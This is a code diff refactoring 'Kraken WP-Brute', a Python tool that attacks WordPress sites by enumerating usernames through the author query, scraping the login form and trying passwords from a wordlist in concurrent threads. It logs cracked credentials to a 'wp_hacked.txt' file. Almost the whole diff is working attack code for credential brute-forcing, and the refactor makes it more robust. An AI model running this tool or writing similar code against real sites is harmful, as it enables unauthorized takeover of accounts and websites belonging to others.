@@ -3,62 +3,26 @@ import sys
 import time
 import requests
 import re
-import logging
 from random import choice
-from colorama import Fore, Style, init
-import pyfiglet
+from colorama import Fore, Style
 import gevent
 from gevent.pool import Pool
 from gevent import monkey
 
-
 monkey.patch_all()
 
+from core.ui import clear_console, display_banner, status, success, error, info
+from core.utils import load_file_lines
+from core.logger import setup_logger
 
-init(autoreset=True)
-
-
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
-
-
-script_dir = os.path.dirname(os.path.realpath(__file__))
-results_dir = os.path.join(script_dir, 'Results')
-logs_dir = os.path.join(script_dir, 'Logs')
-
-
+script_dir = os.path.dirname(os.path.abspath(__file__))
+results_dir = os.path.join(script_dir, '..', 'Results')
+logs_dir = os.path.join(script_dir, '..', 'Logs')
 os.makedirs(results_dir, exist_ok=True)
-os.makedirs(logs_dir, exist_ok=True)
 
-
-logging.basicConfig(filename=os.path.join(logs_dir, 'wp_brute.log'), 
-                    level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
-
-def clear_console():
-    """Clears the console window."""
-    os.system('cls' if os.name == 'nt' else 'clear')
-
-def display_banner():
-    """Displays the script banner with random color."""
-    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
-    banner_color = choice(colors)
-    banner = pyfiglet.figlet_format("Kraken WP-Brute", font="slant")
-    print(Style.BRIGHT + banner_color + banner)
-    print(Style.RESET_ALL + Fore.WHITE + "="*80 + "\n")
-
-def status(msg):
-    """Prints status messages."""
-    print(Fore.CYAN + "[*] " + msg)
-
-def success(msg):
-    """Prints success messages."""
-    print(Fore.GREEN + "[+] " + msg)
-
-def error(msg):
-    """Prints error messages."""
-    print(Fore.RED + "[-] " + msg)
+logger = setup_logger(os.path.join(logs_dir, 'wp_brute.log'))
 
 def validate_wp(site):
-    """Validates if the site is a WordPress site."""
     status(f"Validating if {site} is a WordPress site...")
     try:
         r = requests.get(site, timeout=10)
@@ -67,68 +31,14 @@ def validate_wp(site):
             return True
         else:
             error(f"{site} is not a WordPress site.")
-            logging.error(f"{site} is not a WordPress site.")
+            logger.error(f"{site} is not a WordPress site.")
             sys.exit(1)
     except Exception as e:
         error(f"Error during validation: {str(e)}")
-        logging.error(f"Validation error: {str(e)}")
+        logger.error(f"Validation error: {str(e)}")
         sys.exit(1)
-
-def get_user_input():
-    """Gathers user input for the WordPress brute force operation."""
-    site = input(Fore.WHITE + '[i] Enter the target: ').strip()
-    if not site.startswith(('http://', 'https://')):
-        site = 'http://' + site
-
-    status("Processing site input...")
-    validate_wp(site)
-
-    username = enumerate_username(site)
-    if not username:
-        use_list = input(Fore.WHITE + "[i] Use username list? (Y/n): " + Fore.RESET).strip().lower()
-        if use_list != 'n':
-            user_file = input(Fore.WHITE + "[i] Username list (default: users.txt, press Enter for default): " + Fore.RESET).strip() or os.path.join(script_dir, "..", "wordlists", "users.txt")
-            status(f"Loading usernames from {user_file}...")
-            if not os.path.isfile(user_file):
-                error(f"Username list not found: {user_file}")
-                logging.error(f"Username list not found: {user_file}")
-                sys.exit(1)
-            usernames = load_usernames(user_file)
-            if not usernames:
-                error("No usernames found in the list.")
-                logging.error("No usernames found.")
-                sys.exit(1)
-            username = usernames[0]
-            success(f"First username from the list selected: {username}")
-        else:
-            username = input(Fore.WHITE + "[i] Enter username : " + Fore.RESET).strip()
-            if not username:
-                error("No username provided.")
-                logging.error("No username provided.")
-                sys.exit(1)
-            success(f"Username entered manually: {username}")
-    else:
-        
-        success(f"Username found via enumeration: {username}")
-        with open(os.path.join(results_dir, 'found_username.txt'), 'w') as user_file:
-            user_file.write(f"Found username: {username}\n")
-
-    pwd_file = input(Fore.WHITE + "[i] Password list (default: passwords.txt, press Enter for default): " + Fore.RESET).strip() or os.path.join(script_dir, "..", "wordlists", "passwords.txt")
-    status(f"Loading passwords from {pwd_file}...")
-    if not os.path.isfile(pwd_file):
-        error(f"Password list not found: {pwd_file}")
-        logging.error(f"Password list not found: {pwd_file}")
-        sys.exit(1)
-
-    threads = int(input(Fore.WHITE + "[i] Enter number of threads to use (default: 10, press Enter for default): ") or 10)
-
-    status("All inputs received successfully.")
-    print(Fore.YELLOW + "-"*60)
-    print(Fore.YELLOW + Style.BRIGHT + "Starting brute-force attack...")
-    return site, username, pwd_file, threads
 
 def enumerate_username(site):
-    """Attempts to enumerate username from the site."""
     status(f"Attempting to enumerate username from {site}...")
     try:
         r = requests.get(f'{site}/?author=1', timeout=10)
@@ -140,27 +50,26 @@ def enumerate_username(site):
         status(Fore.YELLOW + "Username enumeration failed.")
         return None
     except Exception as e:
-        logging.error(f"Enumeration error: {str(e)}")
+        logger.error(f"Enumeration error: {str(e)}")
         return None
 
-def load_usernames(file_path):
-    """Loads usernames from the specified file."""
-    status(f"Loading usernames from {file_path}...")
-    with open(file_path, 'r', encoding='utf-8') as file:
-        usernames = [line.strip() for line in file if line.strip()]
-    success(f"{len(usernames)} usernames loaded.")
-    return usernames
-
-def load_passwords(password_file):
-    """Loads passwords from the specified file."""
-    status(f"Loading passwords from {password_file}...")
-    with open(password_file, 'r', encoding='utf-8') as file:
-        passwords = [line.strip() for line in file if line.strip()]
-    success(f"{len(passwords)} passwords loaded.")
-    return passwords
+def fetch_wp_values(site):
+    status(f"Fetching WordPress form values from {site}...")
+    try:
+        agent = {'User-Agent': 'Mozilla/5.0'}
+        r = requests.get(site + '/wp-login.php', timeout=5, headers=agent)
+        wp_submit_match = re.search(r'class="button button-primary button-large" value="(.*)"', r.text)
+        wp_submit_value = wp_submit_match.group(1) if wp_submit_match else 'Log In'
+        wp_redirect_match = re.search(r'name="redirect_to" value="(.*)"', r.text)
+        wp_redirect_to = wp_redirect_match.group(1) if wp_redirect_match else f'{site}/wp-admin/'
+        success("Form values fetched successfully.")
+        return wp_submit_value, wp_redirect_to
+    except Exception as e:
+        error(f"Error fetching form values: {str(e)}")
+        logger.error(f"Fetch error: {str(e)}")
+        sys.exit(1)
 
 def attempt_login(site, username, password, wp_submit_value, wp_redirect_to, attempt_number, total_attempts, start_time):
-    """Attempts to log in to the WordPress site using provided credentials."""
     agent = {'User-Agent': 'Mozilla/5.0'}
     post_data = {
         'log': username,
@@ -175,81 +84,134 @@ def attempt_login(site, username, password, wp_submit_value, wp_redirect_to, att
         
         elapsed_time = time.time() - start_time
         percentage = (attempt_number / total_attempts) * 100
-        estimated_total_time = elapsed_time / (attempt_number / total_attempts)
+        estimated_total_time = elapsed_time / (attempt_number / total_attempts) if attempt_number > 0 else 0
         remaining_time = estimated_total_time - elapsed_time
         time_remaining_str = time.strftime('%H:%M:%S', time.gmtime(remaining_time))
 
         if 'wordpress_logged_in_' in str(response.cookies):
             success_msg = (
-                f"\n[{attempt_number}/{total_attempts}] Tested - {percentage:.2f}% | Estimated Remaining Time: {time_remaining_str} |"
-                f" Current: {username}:{password}\n"
-                f"\n{Fore.GREEN + Style.BRIGHT}SUCCESS!{Style.RESET_ALL} Valid credentials found!\n"
+                f"\n[{attempt_number}/{total_attempts}] Tested - {percentage:.2f}% | Expected Left: {time_remaining_str} |\n"
+                f"{Fore.GREEN + Style.BRIGHT}SUCCESS! Valid credentials found!{Style.RESET_ALL}\n"
                 f"{Fore.YELLOW}{'-'*40}\n"
                 f"URL: {Fore.CYAN}{site}/wp-login.php{Style.RESET_ALL}\n"
                 f"Username: {Fore.YELLOW}{username}{Style.RESET_ALL}\n"
                 f"Password: {Fore.YELLOW}{password}{Style.RESET_ALL}\n"
                 f"{Fore.YELLOW}{'-'*40}\n"
             )
-            sys.stdout.write('\033[K')  
+            sys.stdout.write('\033[K')
             print(success_msg)
             with open(os.path.join(results_dir, 'wp_hacked.txt'), 'a') as writer:
                 writer.write(success_msg)
-            return False  
+            return True
         else:
-            sys.stdout.write(Fore.MAGENTA + f"\r[{attempt_number}/{total_attempts}] Tested - {percentage:.2f}% | Estimated Remaining Time: {time_remaining_str} | Current: {username}:{password}" + " " * 10)
+            sys.stdout.write(Fore.MAGENTA + f"\r[{attempt_number}/{total_attempts}] Tested - {percentage:.2f}% | Expected Left: {time_remaining_str} | Current: {username}:{password}" + " " * 5)
             sys.stdout.flush()
-            return False  
+            return False
     except Exception as e:
-        logging.error(f"Login attempt error: {str(e)}")
-        return False  
+        logger.error(f"Login attempt error: {str(e)}")
+        return False
 
-def run_bruteforce(site, username, passwords, wp_submit_value, wp_redirect_to, threads):
-    """Runs brute-force attack with gevent-based concurrency using user-defined threads."""
+def execute_brute(site, username, passwords, wp_submit_value, wp_redirect_to, threads):
     total_attempts = len(passwords)
     start_time = time.time()
-    attempt_number = 0
+    attempt_counter = [0]
 
     def worker(password):
-        nonlocal attempt_number
-        attempt_number += 1
-        attempt_login(site, username, password, wp_submit_value, wp_redirect_to, attempt_number, total_attempts, start_time)
+        attempt_counter[0] += 1
+        return attempt_login(site, username, password, wp_submit_value, wp_redirect_to, attempt_counter[0], total_attempts, start_time)
 
-    pool = Pool(threads)  
-    pool.map(worker, passwords)  
+    pool = Pool(threads)
+    try:
+        pool.map(worker, passwords)
+    except KeyboardInterrupt:
+        print(Fore.YELLOW + "\n[!] Script interrupted by user. Shutting down threads...")
+        os._exit(0)
 
-    
     sys.stdout.write('\n')
     print(Fore.GREEN + "\nBrute-force attack completed.")
 
-def fetch_wp_values(site):
-    """Fetches WordPress form values needed for login."""
-    status(f"Fetching WordPress form values from {site}...")
-    try:
-        agent = {'User-Agent': 'Mozilla/5.0'}
-        r = requests.get(site + '/wp-login.php', timeout=5, headers=agent)
-        wp_submit_value = re.search(r'class="button button-primary button-large" value="(.*)"', r.text).group(1)
-        wp_redirect_to = re.search(r'name="redirect_to" value="(.*)"', r.text).group(1)
-        success("Form values fetched successfully.")
-        return wp_submit_value, wp_redirect_to
-    except Exception as e:
-        error(f"Error fetching form values: {str(e)}")
-        logging.error(f"Fetch error: {str(e)}")
+def run(target, users_file, username, passwords_file, threads):
+    clear_console()
+    display_banner("Kraken WP-Brute")
+    info("\n" + "="*80 + "\n")
+
+    if not target.startswith(('http://', 'https://')):
+        target = 'http://' + target
+
+    validate_wp(target)
+
+    if not username:
+        username = enumerate_username(target)
+        if not username:
+            if users_file:
+                usernames = load_file_lines(users_file)
+                username = usernames[0] if usernames else None
+            else:
+                error("No username or user list provided, and enumeration failed.")
+                sys.exit(1)
+
+    passwords = load_file_lines(passwords_file)
+    if not passwords:
+        error(f'Password list {passwords_file} is empty or missing.')
         sys.exit(1)
 
-def main():
+    wp_submit_value, wp_redirect_to = fetch_wp_values(target)
+    execute_brute(target, username, passwords, wp_submit_value, wp_redirect_to, threads)
+
+def run_interactive():
     clear_console()
-    display_banner()
+    display_banner("Kraken WP-Brute")
+    
+    site = input(Fore.WHITE + '[i] Enter the target: ').strip()
+    if not site.startswith(('http://', 'https://')):
+        site = 'http://' + site
 
-    site, username, pwd_file, threads = get_user_input()
+    status("Processing site input...")
+    validate_wp(site)
+
+    username = enumerate_username(site)
+    if not username:
+        use_list = input(Fore.WHITE + "[i] Use username list? (Y/n): " + Fore.RESET).strip().lower()
+        if use_list != 'n':
+            user_file_default = os.path.join(script_dir, "..", "wordlists", "users.txt")
+            user_file = input(Fore.WHITE + "[i] Username list (default: users.txt): " + Fore.RESET).strip() or user_file_default
+            usernames = load_file_lines(user_file)
+            if not usernames:
+                error("No usernames found in the list.")
+                sys.exit(1)
+            username = usernames[0]
+            success(f"First username from the list selected: {username}")
+        else:
+            username = input(Fore.WHITE + "[i] Enter username : " + Fore.RESET).strip()
+            if not username:
+                error("No username provided.")
+                sys.exit(1)
+            success(f"Username entered manually: {username}")
+    else:
+        success(f"Username found via enumeration: {username}")
+        with open(os.path.join(results_dir, 'found_username.txt'), 'w') as user_file:
+            user_file.write(f"Found username: {username}\n")
+
+    pwd_file_default = os.path.join(script_dir, "..", "wordlists", "passwords.txt")
+    pwd_file = input(Fore.WHITE + "[i] Password list (default: passwords.txt): " + Fore.RESET).strip() or pwd_file_default
+    passwords = load_file_lines(pwd_file)
+    
+    threads = int(input(Fore.WHITE + "[i] Enter number of threads to use (default: 10): ") or 10)
+
+    if not username or not passwords:
+        error("Error: The username or password list is empty or could not be found.")
+        sys.exit(1)
+
+    status("All inputs received successfully.")
+    print(Fore.YELLOW + "-"*60)
+    print(Fore.YELLOW + Style.BRIGHT + "Starting brute-force attack...")
+    
     wp_submit_value, wp_redirect_to = fetch_wp_values(site)
-
-    passwords = load_passwords(pwd_file)
-    print(Style.RESET_ALL + Fore.WHITE + "\n" + "="*80 + "\n")
-    run_bruteforce(site, username, passwords, wp_submit_value, wp_redirect_to, threads)
+    execute_brute(site, username, passwords, wp_submit_value, wp_redirect_to, threads)
 
 if __name__ == '__main__':
     try:
-        main()
+        run_interactive()
     except KeyboardInterrupt:
-        logging.info("Script interrupted by user.")
+        logger.info("Script interrupted by user.")
         print(Fore.YELLOW + "Script interrupted by user.")
